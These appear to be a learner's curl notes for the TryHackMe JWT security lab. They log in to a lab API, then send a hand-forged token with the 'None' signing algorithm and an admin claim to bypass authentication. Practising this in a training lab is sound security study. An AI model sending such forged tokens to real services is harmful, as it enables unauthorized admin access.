https://tryhackme.com/room/jwtsecurity

```sh
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password1" }' http://10.10.227.117/api/v1.0/example1
```

```sh
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password2" }' http://10.10.227.117/api/v1.0/example2

curl -H 'Authorization: Bearer [token]' http://10.10.227.117/api/v1.0/example2?username=user
# https://jwt.io/

```

```sh
curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9.GkcMaQDWUQQht9yN7oye44wqL58d0T-0Qj90sSH0los' http://10.10.227.117/api/v1.0/example3?username=admin
```
